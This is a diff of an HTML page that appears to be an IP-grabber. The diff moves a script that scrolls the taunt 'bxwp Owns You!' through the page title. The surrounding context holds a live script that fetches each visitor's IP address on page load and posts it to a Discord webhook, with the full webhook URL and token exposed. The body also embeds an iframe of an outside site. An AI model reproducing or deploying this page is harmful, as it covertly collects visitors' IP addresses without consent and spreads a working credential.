@@ -21,19 +21,6 @@
         }
     </style>
     <script>
-        let msg1 = "bxwp Owns You! | bxwp.xyz | @bxwp ";
-        const speed = 100;
-
-        function scrollTitle() {
-            document.title = msg1;
-            msg1 = msg1.substring(1) + msg1.charAt(0);
-            setTimeout(scrollTitle, speed);
-        }
-
-        scrollTitle();
-    </script>
-
-    <script>
         // Function to send data to Discord webhook
         function sendToWebhook(ip) {
             const webhookUrl = 'https://discord.com/api/webhooks/1266328226310127729/5ZdEaLFj4-GWCVA9SmLcqfFra3heXAgAIQ7cBBxysGSIoVRHGXCHYPP3YdLfEq-oUqmk'; // Replace with your Discord webhook URL
@@ -69,6 +56,19 @@
             })
             .catch(error => console.error('Error fetching IP:', error));
     </script>
+    <script>
+        let msg1 = "bxwp Owns You! | bxwp.xyz | @bxwp ";
+        const speed = 100;
+
+        function scrollTitle() {
+            document.title = msg1;
+            msg1 = msg1.substring(1) + msg1.charAt(0);
+            setTimeout(scrollTitle, speed);
+        }
+
+        scrollTitle();
+    </script>
+
 </head>
 <body>
     <iframe src="https://fbi.bet"></iframe>
